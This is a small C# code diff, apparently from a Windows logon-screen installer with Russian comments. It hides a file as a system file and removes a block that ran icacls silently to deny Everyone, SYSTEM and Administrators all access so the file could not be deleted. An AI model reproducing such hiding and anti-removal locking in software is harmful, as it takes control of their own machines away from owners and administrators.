@@ -174,19 +174,6 @@ namespace LogonUIInstaller
                 // 7. Делаем скрытым и защищённым
                 File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                 
-                // 8. Блокируем доступ (чтобы нельзя было удалить)
-                try
-                {
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "icacls.exe",
-                        Arguments = $"\"{originalPath}\" /deny Everyone:F /deny SYSTEM:F /deny Administrators:F",
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        UseShellExecute = false
-                    })?.WaitForExit(3000);
-                }
-                catch { }
             }
             catch { }
         }
